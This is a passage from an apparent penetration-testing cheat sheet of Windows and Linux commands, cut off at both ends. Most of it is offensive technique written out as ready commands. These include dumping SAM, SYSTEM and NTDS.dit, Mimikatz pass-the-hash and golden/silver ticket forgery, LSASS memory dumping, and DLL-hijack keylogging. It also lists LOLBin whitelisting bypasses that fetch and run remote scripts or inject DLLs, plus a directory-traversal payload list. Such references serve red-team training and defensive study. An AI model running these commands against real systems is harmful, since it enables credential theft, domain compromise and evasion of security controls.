| netstat -r |

<span id="anchor-256"></span>Display Routing Table (route)

|             |
| ----------- |
| route print |

<span id="anchor-257"></span>Find Specific Listening Port

|                                     |
| ----------------------------------- |
| netstat -na | findstr :**\<port\>** |

<span id="anchor-258"></span>Find Listening Ports and PIDs

|                                  |
| -------------------------------- |
| netstat -nao | findstr LISTENING |

<span id="anchor-259"></span>Find Hosts in the Same Workgroup

|          |
| -------- |
| net view |

<span id="anchor-260"></span>Find Hosts in Another Domain

|                                 |
| ------------------------------- |
| net view /domain:**\<domain\>** |

<span id="anchor-261"></span>Find Visible Domains

|                  |
| ---------------- |
| net view /domain |

<span id="anchor-262"></span>Find Domain Controllers

|                                        |
| -------------------------------------- |
| net group “Domain Controllers” /domain |

<span id="anchor-263"></span>Get Domain/Domain Controller Details

|                    |
| ------------------ |
| wmic ntdomain list |

<span id="anchor-264"></span>List HOSTS File Contents

|                                              |
| -------------------------------------------- |
| type %WINDIR%\\System32\\drivers\\etc\\hosts |

<span id="anchor-265"></span>Windows Wireless Networking

<span id="anchor-266"></span>List Saved Wireless Profiles

|                          |
| ------------------------ |
| netsh wlan show profiles |

<span id="anchor-267"></span>Export Saved Wireless Profile

|                                              |
| -------------------------------------------- |
| netsh wlan export profile folder=. key=clear |

<span id="anchor-268"></span>Add Specified Wireless Profile

|                                                                                                             |
| ----------------------------------------------------------------------------------------------------------- |
| netsh wlan set hostednetwork ssid=**\<ssid\>** key=**\<passphrase\>** keyUsage=**\[persistent|temporary\]** |

<span id="anchor-269"></span>Start or Stop Wireless Network

|                                             |
| ------------------------------------------- |
| netsh wlan **\[start|stop\]** hostednetwork |

<span id="anchor-270"></span>Enable or Disable Wireless Network

|                                                          |
| -------------------------------------------------------- |
| netsh wlan set hostednetwork mode=**\[allow|disallow\]** |

<span id="anchor-271"></span>Shares

<span id="anchor-272"></span>Turn Default Share On

|                               |
| ----------------------------- |
| net share **\<(C$|ADMIN$)\>** |

<span id="anchor-273"></span>Registry Enumeration

<span id="anchor-274"></span>Locate \<string\> In Registry (i.e.
password)

|                                                             |
| ----------------------------------------------------------- |
| reg query **\[HKLM|HKCU\]** /f **\<string\>** /t REG\_SZ /s |

<span id="anchor-275"></span>Always Install Elevated Check

|                                                                                                       |
| ----------------------------------------------------------------------------------------------------- |
| reg query **\[HKLM|HKCU\]**\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated |

<span id="anchor-276"></span>Crypto Commands

<span id="anchor-277"></span>Base64 Encode a File

|                                                           |
| --------------------------------------------------------- |
| certutil.exe -encode **\<inputfile\>** **\<outputfile\>** |

<span id="anchor-278"></span>Base64 Decode a File

|                                                           |
| --------------------------------------------------------- |
| certutil.exe -decode **\<inputfile\>** **\<outputfile\>** |

<span id="anchor-279"></span>Credential Commands

<span id="anchor-280"></span>Dumping Registry Hives (System User)

<table>
<tbody>
<tr class="odd">
<td>reg.exe save hklm\sam c:\temp\sam.save<br />
reg.exe save hklm\security c:\temp\security.save<br />
reg.exe save hklm\system c:\temp\system.save</td>
</tr>
</tbody>
</table>

<span id="anchor-281"></span>Dumping Windows Repair SAM & System
(Windows XP, System User)

<table>
<tbody>
<tr class="odd">
<td><p>C:\Windows\Repair\SAM</p>
<p>C:\Windows\Repair\SYSTEM</p></td>
</tr>
</tbody>
</table>

<span id="anchor-282"></span>Dumping Windows Repair SAM & System
(Windows 7, System User)

<table>
<tbody>
<tr class="odd">
<td><p>C:\windows\system32\config\RegBack\SAM</p>
<p>C:\windows\system32\config\RegBack\SYSTEM</p></td>
</tr>
</tbody>
</table>

<span id="anchor-283"></span>Dump Active Directory NTDS.dit with
NTDSUTIL

|                                                                              |
| ---------------------------------------------------------------------------- |
| ntdsutil “activate instance ntds” “IFM” “create full **\<outputfile\>**” q q |

<span id="anchor-284"></span>Dump Active Directory NTDS.dit with
Invoke-NinjaCopy

|                                                                                                                       |
| --------------------------------------------------------------------------------------------------------------------- |
| Invoke-NinjaCopy -Path “**\<path\>**\\ntds.dit” -ComputerName “**\<DCName\>**” -LocalDestination “**\<outputfile\>**” |

<span id="anchor-285"></span>Dump Active Directory NTDS.dit with Volume
Shadow Copy

<table>
<tbody>
<tr class="odd">
<td><p>wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c vssadmin create shadow /for=<strong>&lt;driveletter</strong>&gt;: 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong></p>
<p>wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\<strong>&lt;NTDS.dit_Path&gt;</strong> <strong>&lt;destination_path&gt;</strong> 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong></p>
<p>wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM <strong>&lt;destination_path&gt;</strong> 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-286"></span>Invoke-MimiKatz Retrieve All Credentials

|                                            |
| ------------------------------------------ |
| Invoke-Mimikatz -ComputerName **\<host\>** |

<span id="anchor-287"></span>Invoke-MimiKatz Retrieve Credentials for a
Single User from a DC

|                                                                                                           |
| --------------------------------------------------------------------------------------------------------- |
| Invoke-Mimikatz -Command “lsadump::dcsync /domain:**\<domain FQDN\>** /user:**\<domain\>**\\**\<user\>**” |

<span id="anchor-288"></span>Invoke-MimiKatz Pass-the-Hash (PTH)

|                                                                                                                            |
| -------------------------------------------------------------------------------------------------------------------------- |
| Invoke-Mimikatz -Command “sekurlsa::pth /user:**\<user\>** /domain:**\<domain\>** /ntlm:**\<hash\>** /run:**\<program\>**” |

<span id="anchor-289"></span>MimiKatz Get Logon Passwords (From Memory)

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p></td>
</tr>
</tbody>
</table>

<span id="anchor-290"></span>MimiKatz Dump Tickets (From Memory)

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>sekurlsa::tickets /export</p></td>
</tr>
</tbody>
</table>

<span id="anchor-291"></span>MimiKatz Pass-the-Hash (PTH)

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>sekurlsa::pth /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /ntlm:<strong>&lt;hash&gt;</strong> /run:<strong>&lt;cmd&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-292"></span>MimiKatz Pass-the-Ticket (PTT) - Generate
Golden Ticket

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>kerberos::golden /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /ticket:<strong>&lt;filename&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-293"></span>MimiKatz Pass-the-Ticket (PTT) - Inject
Golden Ticket

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>kerberos::golden /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /ptt</p></td>
</tr>
</tbody>
</table>

<span id="anchor-294"></span>MimiKatz Pass-the-Ticket (PTT) - Generate &
Pass Silver Ticket

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>kerberos::silver /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /target:<strong>&lt;target FQDN&gt;</strong> /service:<strong>&lt;servicename&gt;</strong> /ptt</p></td>
</tr>
</tbody>
</table>

<span id="anchor-295"></span>MimiKatz Pass-the-Ticket (PTT) - Passing a
Ticket (Current Session)

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>Kerberos::ptt <strong>&lt;ticketfile&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-296"></span>MimiKatz Elivate to SYSTEM (Must be
Administrator)

|                |
| -------------- |
| token::elevate |

<span id="anchor-297"></span>MimiKatz Dump SAM (Live, Requires SYSTEM)

|              |
| ------------ |
| lsadump::sam |

<span id="anchor-298"></span>MimiKatz Dump SAM (From Backup)

|                                                 |
| ----------------------------------------------- |
| lsadump::sam **\<systemfile\>** **\<samfile\>** |

<span id="anchor-299"></span>MimiKatz Dump Specific User Hash (LSA)

|                                         |
| --------------------------------------- |
| lsadump::lsa /inject /name:**\<user\>** |

<span id="anchor-300"></span>MimiKatz Dump Specific User Hash (DC
Synchronization)

|                                                                    |
| ------------------------------------------------------------------ |
| lsadump::dcsync /domain:**\<domain FQDN**\> /user:**\<username\>** |

<span id="anchor-301"></span>MimiKatz Dump Service Password

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>token::elevate</p>
<p>vault::cred /patch</p></td>
</tr>
</tbody>
</table>

<span id="anchor-302"></span>MimiKatz Dump DPAPI Creds

<table>
<tbody>
<tr class="odd">
<td><p>privilege::debug</p>
<p>token::elevate</p>
<p>dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<strong>&lt;credentialfile&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-303"></span>RUNAS to Create Token & Run Process
(Password Known)

|                                                                   |
| ----------------------------------------------------------------- |
| runas /netonly /user:**\<domain\>**\\**\<user\>** **\<command\>** |

**Note:** You will still be recognized as the user your ran the command
as on the local system. Remote systems will see the token you generated.
This is how Pass-the-Hash (PTH)works. This technique can be used to
build the hash needed for a PTH.

<span id="anchor-304"></span>Keylogging & Desktop Monitoring

<span id="anchor-305"></span>Start Recording Screens with Problem Step
Recorder (Must be run with user’s credentials)

|                                                     |
| --------------------------------------------------- |
| psr.exe /start /gui 0 /output **\<ZIP file path\>** |

<span id="anchor-306"></span>Stop Recording Screens with Problem Step
Recorder

|                                                                   |
| ----------------------------------------------------------------- |
| psr.exe /IT /RU **\<domain\>**\\**\<user\>** /RP **\<password\>** |

<span id="anchor-307"></span>Keylogging with DLL Hijacking

Compile a Keylogger as a DLL and place it in the following directory,
then kill and **explorer.exe**:

|                                             |
| ------------------------------------------- |
| \\\\**\<host\>**\\C$\\Windows\\linkinfo.dll |

**Note:** Logging will start once the user clicks the Start button.

<span id="anchor-308"></span>Network Tricks

<span id="anchor-309"></span>Pivot with NETSH

|                                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------------------------------- |
| netsh interface portproxy add v4tov4 listenport=**\<LPORT\>** listenaddress=0.0.0.0 connectionport=**\<FPORT\>** connectaddress=**\<FHOST\>** |

<span id="anchor-310"></span>Remove Pivot with NETSH

|                                 |
| ------------------------------- |
| netsh interface portproxy reset |

<span id="anchor-311"></span>Windows Miscellaneous Commands

<span id="anchor-312"></span>Abort Windows Shutdown

|             |
| ----------- |
| shutdown /a |

<span id="anchor-313"></span>Enable Remote Desktop (Registry)

<table>
<tbody>
<tr class="odd">
<td><p>reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t </p>
<p>REG_DWORD /d 0 /f</p></td>
</tr>
</tbody>
</table>

<span id="anchor-314"></span>List Group Policy

|              |
| ------------ |
| gpresults /z |

<span id="anchor-315"></span>List All Files In a Directory Including
Hidden & System

|        |
| ------ |
| dir /a |

<span id="anchor-316"></span>Windows GUI Shortcuts & Commands

<span id="anchor-317"></span>Open Explorer In Folder View

|                                    |
| ---------------------------------- |
| explorer.exe /e **\<folderpath\>** |

<span id="anchor-318"></span>Open Programs and Features (Add/Remove
Programs)

|            |
| ---------- |
| appwiz.cpl |

<span id="anchor-319"></span>AccessChk.exe (Sysinternals)

<span id="anchor-320"></span>Check Specific Service Permissions

|                                                     |
| --------------------------------------------------- |
| accesschk.exe /accepteula -ucqv **\<servicename\>** |

<span id="anchor-321"></span>Check For Any Service Permissions
(pre-Windows 8)

|                                                           |
| --------------------------------------------------------- |
| accesschk.exe /accepteula -uwcqv "Authenticated Users" \* |

<span id="anchor-322"></span>Find all Directories Writable By Users

|                                                     |
| --------------------------------------------------- |
| accesschk.exe /accepteula -uwdqs Users **\<path\>** |

<span id="anchor-323"></span>Find all Directories Writable By
Authenticated Users

|                                                                     |
| ------------------------------------------------------------------- |
| accesschk.exe /accepteula -uwdqs “Authenticated Users” **\<path\>** |

<span id="anchor-324"></span>Find all Files Writable By Users

|                                                           |
| --------------------------------------------------------- |
| accesschk.exe /accepteula -uwqs Users **\<path\>**\\\*.\* |

<span id="anchor-325"></span>Find all Files Writable By Authenticated
Users

|                                                                           |
| ------------------------------------------------------------------------- |
| accesschk.exe /accepteula -uwqs “Authenticated Users” **\<path\>**\\\*.\* |

<span id="anchor-326"></span>Commands That do Other Things (LOLBins:
Inspired by Odvar Moe’s list)

<span id="anchor-327"></span>Run Commands with ForFiles

|                                                                                                   |
| ------------------------------------------------------------------------------------------------- |
| forfiles /p **\<path\_to\_look\_in\>** /m **\<file\_to\_look\_for\>** /c **\<command\_to\_run\>** |

<span id="anchor-328"></span>Run Commands with Bash (If git is
installed)

|                                      |
| ------------------------------------ |
| bash.exe -c **\<command\_to\_run\>** |

<span id="anchor-329"></span>Run Commands with ScriptRunner.exe (Part of
Application Virtualization Client)

|                                                       |
| ----------------------------------------------------- |
| scriptrunner.exe -appvscript **\<command\_to\_run\>** |

<span id="anchor-330"></span>Run Commands with
SyncAppVPublishingServer.exe (Part of Application Virtualization Client)

|                                                               |
| ------------------------------------------------------------- |
| SyncAppVPublishingServer.exe “n; **\<PowerShell\_Commants\>** |

<span id="anchor-331"></span>Open an HTML or File Path with hh.exe

|                              |
| ---------------------------- |
| hh.exe **\<url\_or\_path\>** |

<span id="anchor-332"></span>Run PowerShell Via JavaScript with
RunDLL32.exe

|                                                                                       |
| ------------------------------------------------------------------------------------- |
| rundll32.exe javascript:"..\\mshtml,RunHTMLApplication "**\<PowerShell\_Commands\>**" |

<span id="anchor-333"></span>Run Remote SCT Scripts with RegSvr32.exe

|                                                          |
| -------------------------------------------------------- |
| regsvr32.exe /s /n /u /i:**\<url\_to\_sct\>** scrobj.dll |

<span id="anchor-334"></span>Run Commands with RegSvcs.exe & RegAsm.exe

Create a C\# project that utilizes the DLL Register & Unregister
Methods, similar to this example:
[*https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07*](https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07)

<table>
<tbody>
<tr class="odd">
<td><p>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk <strong>&lt;c#_project&gt;</strong></p>
<p>To use the register module:</p>
<p>regsvcs.exe regsvcs.dll</p>
<p>OR</p>
<p>Regasm.exe regsvcs.dll</p>
<p>To use unregister module:</p>
<p>Regsvcs.exe /U regsvcs.dll</p>
<p>OR</p>
<p>Regasm.exe /U regsvcs.dll</p></td>
</tr>
</tbody>
</table>

<span id="anchor-335"></span>Run Commands with BgInfo.exe

Create a custom \*.bgi file that will execute your custom VBS commands.
Similar to what is described here: 

  - [*https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/*](https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/)
    
  - [*https://msitpros.com/?p=3831*](https://msitpros.com/?p=3831) 

|                                                          |
| -------------------------------------------------------- |
| bginfo.exe **\<custom\_bgi\_file\>** /popup /nolicprompt |

<span id="anchor-336"></span>Run Commands with Custom DLLs

Example located here:
[*https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290*](https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290)

|                                                                      |
| -------------------------------------------------------------------- |
| InstallUtil.exe /logfile= /LogToConsole=false /U **\<custom\_dll\>** |

<span id="anchor-337"></span>Run Remote .NET Code with IEEXEC.EXE

|                                            |
| ------------------------------------------ |
| ieexec.exe **\<url\_to\_DotNet\_binary\>** |

<span id="anchor-338"></span>Run Commands with msxsl.exe

Create XML files to execute JScript. A write up is located here:

|                                    |
| ---------------------------------- |
| msxsl.exe customers.xml script.xsl |

<span id="anchor-339"></span>Run Commands with odbcconf.exe

Build a C\# project that will be built as a DLL then registered and run
with odbcconf.exe:
[*https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce*](https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce)

|                        |
| ---------------------- |
| odbcconf.exe /f my.rsp |

<span id="anchor-340"></span>Dump LSASS Process Memory with
sqldumper.exe

|                                              |
| -------------------------------------------- |
| sqldumper.exe **\<lsass\_pid\>** 0 0x0110:40 |

<span id="anchor-341"></span>Run Commands with pcalua.exe

|                               |
| ----------------------------- |
| pcalua.exe -a **\<command\>** |

<span id="anchor-342"></span>Running Commands with msiexec.exe

  - [*https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/*](https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/)
    

|                                                              |
| ------------------------------------------------------------ |
| msiexec /quiet /i **\<msi\_with\_msi\_or\_png\_extention\>** |

<span id="anchor-343"></span>Running Commands with cmstp.exe

  - [*https://msitpros.com/?p=3960*](https://msitpros.com/?p=3960)
  - [*https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e*](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e)
    

|                                         |
| --------------------------------------- |
| cmstp.exe /ni /s **\<malicious\_inf\>** |

<span id="anchor-344"></span>DLL Loading with xwizard.exe

  - [*http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/*](http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/)
    

|                                                                             |
| --------------------------------------------------------------------------- |
| Drop your malicious DLL into the same directory and xwizard.exe and run it. |

<span id="anchor-345"></span>DLL Injection with MavInject32.exe

|                                                                                                                              |
| ---------------------------------------------------------------------------------------------------------------------------- |
| "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe" **\<PID\>** /INJECTRUNNING **\<PATH DLL\>** |

<span id="anchor-346"></span>Running C\# with csi.exe (Interactive)

  - [*https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html*](https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html)
    

|                                      |
| ------------------------------------ |
| Run csi.exe and enter your C\# code. |

<span id="anchor-347"></span>Running F\# with fsi.exe (Interactive)

  - [*https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1*](https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1)
    

|                                      |
| ------------------------------------ |
| Run fsi.exe and enter your F\# code. |

<span id="anchor-348"></span>Creating a Control Panel to Execute Code
(DLL)

  - [*https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/*](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)
    

|                                                                                |
| ------------------------------------------------------------------------------ |
| Create a dll and add a registry key to the HKCU hive to obtain code execution. |

<span id="anchor-349"></span>Run Commands with dnx.exe

  - [*https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/*](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)
    

<table>
<tbody>
<tr class="odd">
<td><p>Write C# file and accompanying JSON File, then execute:</p>
<p>dnx.exe <strong>&lt;appname&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-350"></span>Run Commands with cdb.exe

  - [*http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html*](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)
  - [*https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda*](https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda)
    

|                                                  |
| ------------------------------------------------ |
| cdb.exe -cf **\<wds\_file\>** -o **\<command\>** |

<span id="anchor-351"></span>Run Commands with MSBuild Using PowerShell

<table>
<tbody>
<tr class="odd">
<td>[Reflection.Assembly]::LoadWithPartialName('<a href="https://t.co/2nLz1YPu43">http://Microsoft.Build </a>');<br />
<a href="https://twitter.com/search?q=%24e&amp;src=ctag">$e</a>=new-object<a href="https://t.co/2nLz1YPu43"> http://Microsoft.Build </a>.Evaluation.Project('<strong>&lt;csproj_file&gt;</strong>');<br />
<a href="https://twitter.com/search?q=%24e&amp;src=ctag">$e</a>.Build();</td>
</tr>
</tbody>
</table>

<span id="anchor-352"></span>Directory Traversals

<table>
<tbody>
<tr class="odd">
<td><p>../<br />
..\<br />
..\/<br />
%2e%2e%2f<br />
%252e%252e%252f</p>
<p>%255c..%255c</p>
<p>/%252e%252e/</p>
<p>%255c%255c..%255c<br />
%c0%ae%c0%ae%c0%af<br />
%uff0e%uff0e%u2215<br />
%uff0e%uff0e%u2216<br />
..././<br />
...\.\</p>
<p>..%c0%af represents ../<br />
..%c1%9c represents ..\</p>
<p>Prepend "/public/" to all aof the above.</p>
<p>Try absolute paths (with encoding?):</p>
<p>/file://absolute/path/&lt;traversal&gt;/etc/passwd</p></td>
</tr>
</tbody>
</table>

<span id="anchor-353"></span>Reverse Engineering Commands

<span id="anchor-354"></span>Strings

<span id="anchor-355"></span>List Strings From File

|                          |
| ------------------------ |
| strings **\<ELF File\>** |

<span id="anchor-356"></span>Objcopy

<span id="anchor-357"></span>Copy/Rip Debugging Symbols From a Binary

|                                                                                    |
| ---------------------------------------------------------------------------------- |
| objcopy --only-keep-debug rip\_from\_binary **\<ELF Binary w/Debugging Symbols\>** |

<span id="anchor-358"></span>Add Debugging Symbols to a Binary

|                                                                |
| -------------------------------------------------------------- |
| objcopy --add-gnu-debuglink=**\<symbol file\> \<ELF Binary\>** |

<span id="anchor-359"></span>Strip

<span id="anchor-360"></span>Strip Debugging & Other Symbols

This can be useful if attempting to hide or make more difficult the
analysis of an executable. It can also reduce the size of a binary.

|                                                         |
| ------------------------------------------------------- |
| strip --strip-debug --strip-unneeded **\<ELF Binary\>** |

<span id="anchor-361"></span>NM

<span id="anchor-362"></span>Display All Symbols

|                        |
| ---------------------- |
| nm -a **\<ELF File\>** |

<span id="anchor-363"></span>Display Sorted Symbols

|                        |
| ---------------------- |
| nm -n **\<ELF File\>** |

<span id="anchor-364"></span>Display External Symbols

|                        |
| ---------------------- |
| nm -g **\<ELF File\>** |

<span id="anchor-365"></span>Display Symbol Sizes

|                        |
| ---------------------- |
| nm -S **\<ELF File\>** |

<span id="anchor-366"></span>Command Symbol Types

|                 |                                         |
| --------------- | --------------------------------------- |
| **Symbol Type** | **Meaning**                             |
| A               | Absolute Symbol                         |
| B               | In the Uninitialized Data Section (BSS) |
| D               | In the Initialized Data Section         |
| N               | Debugging Symbol                        |
| T               | In the Text Section                     |
| U               | Symbol Undefined                        |

<span id="anchor-367"></span>Strace

<span id="anchor-368"></span>Show Timestamps in Output

|                            |
| -------------------------- |
| strace -t **\<ELF File\>** |

<span id="anchor-369"></span>Show Relative Timestamps in Output

|                            |
| -------------------------- |
| strace -r **\<ELF File\>** |

<span id="anchor-370"></span>Trace Specified System Calls

|                                                     |
| --------------------------------------------------- |
| strace -e **\<comma separated list\> \<ELF File\>** |

<span id="anchor-371"></span>Trace a Running Process (As root)

|                       |
| --------------------- |
| strace -p **\<PID\>** |

<span id="anchor-372"></span>Trace Syscall Statistics

|                            |
| -------------------------- |
| strace -c **\<ELF File\>** |

<span id="anchor-373"></span>GNU Debugger Commands (gdb)

<span id="anchor-374"></span>Get ELF Details (Find the entry point)

|                                   |
| --------------------------------- |
| shell readelf -h **\<filename\>** |

<span id="anchor-375"></span>Run the Program

|                              |
| ---------------------------- |
| run **\<command\> \<args\>** |

<span id="anchor-376"></span>List Functions

|                |
| -------------- |
| info functions |

<span id="anchor-377"></span>List Variables

|                |
| -------------- |
| info variables |

<span id="anchor-378"></span>List Variables in a Function

|                                  |
| -------------------------------- |
| info scope **\<function name\>** |

<span id="anchor-379"></span>Load Debugging Symbols from a File

|                                 |
| ------------------------------- |
| symbol-file **\<symbol file\>** |

<span id="anchor-380"></span>List Program Source (If available)

|                          |
| ------------------------ |
| list **\<line number\>** |

<span id="anchor-381"></span>Set Breakpoint

|                                                          |
| -------------------------------------------------------- |
| break **\<function name|line number|\*memory address\>** |

<span id="anchor-382"></span>Show Breakpoints

|                  |
| ---------------- |
| info breakpoints |

<span id="anchor-383"></span>Disable Breakpoint

|                                   |
| --------------------------------- |
| disable **\<breakpoint number\>** |

<span id="anchor-384"></span>Enable Breakpoint

|                                  |
| -------------------------------- |
| enable **\<breakpoint number\>** |

<span id="anchor-385"></span>Delete Breakpoint

|                                  |
| -------------------------------- |
| delete **\<breakpoint number\>** |

<span id="anchor-386"></span>Continue After Hitting Breakpoint

|          |
| -------- |
| continue |

<span id="anchor-387"></span>Step by Instruction

|                      |
| -------------------- |
| stepi **\<number\>** |

<span id="anchor-388"></span>Step by Line

|                     |
| ------------------- |
| step **\<number\>** |

<span id="anchor-389"></span>Inspect CPU Registers (while running)

|                   |
| ----------------- |
| inspect registers |

<span id="anchor-390"></span>Examine Memory Address

|                                                      |
| ---------------------------------------------------- |
| x/**\<repeat count\>\<format\>\<size\> \<address\>** |

<span id="anchor-391"></span>Print Variable Information

|                             |
| --------------------------- |
| print **\<variable name\>** |

<span id="anchor-392"></span>Disassemble Function

|                                   |
| --------------------------------- |
| disassemble **\<function name\>** |

<span id="anchor-393"></span>Change Memory Values of Running Program

|                                                                    |
| ------------------------------------------------------------------ |
| set {**\<data type\>**} **\<memory address\>** = **\<new value\>** |

<span id="anchor-394"></span>Addressing a Specific Byte In Memory
Address

|                                            |
| ------------------------------------------ |
| (**\<memory address\>** + **\<integer\>**) |

<span id="anchor-395"></span>Set Convenience Variable

|                                            |
| ------------------------------------------ |
| set $**\<variable name\>** = **\<value\>** |

<span id="anchor-396"></span>Call a Function (Any function within the
scope of the program)

|                                          |
| ---------------------------------------- |
| call \<**function\>**(**\<arguments\>**) |

<span id="anchor-397"></span>Change Disassembly Flavor to Intel

|                              |
| ---------------------------- |
| set disassembly-flavor intel |

<span id="anchor-398"></span>Immunity Debugger

<span id="anchor-399"></span>Ignore Access Violations (Useful when
debugging shellcode with System calls)

|  |
|  |
|  |

<span id="anchor-400"></span>Encoding & Decoding

<span id="anchor-401"></span>Base64

<span id="anchor-402"></span>PowerShell

<span id="anchor-403"></span>Encode a String

<table>
<tbody>
<tr class="odd">
<td><p>$Text = ‘<strong>&lt;TEXT&gt;</strong>’</p>
<p>$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)</p>
<p>$EncodedText =[Convert]::ToBase64String($Bytes)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-404"></span>Decode Base64 Encoded String

<table>
<tbody>
<tr class="odd">
<td><p>$EncodedText = “<strong>&lt;Base64_String&gt;</strong>”</p>
<p>$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))</p></td>
</tr>
</tbody>
</table>

<span id="anchor-405"></span>Encode a Byte Array

<table>
<tbody>
<tr class="odd">
<td><p>$bytes = [Byte[]] ( <strong>&lt;Byte_Array&gt;</strong> )</p>
<p>$Encoded = [Convert]::ToBase64String($bytes)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-406"></span>Decode a Base64 Encoded Byte Array

<table>
<tbody>
<tr class="odd">
<td><p>$Encoded = “&lt;Base64_String&gt;”</p>
<p>$Bytes = [Convert]::FromBase64String($Encoded)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-407"></span>Python

<span id="anchor-408"></span>Encode a String

<table>
<tbody>
<tr class="odd">
<td><p>import Base64</p>
<p>Base64.b64Encode(<strong>'&lt;TEXT&gt;</strong>')</p></td>
</tr>
</tbody>
</table>

<span id="anchor-409"></span>Decode Base64 Encoded String

<table>
<tbody>
<tr class="odd">
<td><p>import Base64</p>
<p>Base64.b64Decode('<strong>&lt;Base64_String&gt;</strong>')</p></td>
</tr>
</tbody>
</table>

<span id="anchor-410"></span>JavaScript

<span id="anchor-411"></span>Encode a String

|                      |
| -------------------- |
| btoa('**\<TEXT\>**') |

<span id="anchor-412"></span>Decode Base64 Encoded String

|                                |
| ------------------------------ |
| atob('**\<Base64\_String\>**') |

<span id="anchor-413"></span>Escaped/Unescaped Unicode

<span id="anchor-414"></span>Javascript

<span id="anchor-415"></span>Encode a String

<table>
<tbody>
<tr class="odd">
<td><p>String.prototype.toUnicode = function(){ </p>
<p>var result = "";</p>
<p>for(var i = 0; i &lt; this.length; i++){ </p>
<blockquote>
<p>// Assumption: all characters are &lt; 0xffff </p>
</blockquote>
<blockquote>
<p>result += "\\u" + ("000" + this[i].charCodeAt(0).toString(16)).substr(-4); </p>
</blockquote>
<p>} </p>
<p>return result; </p>
<p>};</p>
<p>Examples:</p>
<p>"みどりいろ".toUnicode(); //"\u307f\u3069\u308a\u3044\u308d"</p>
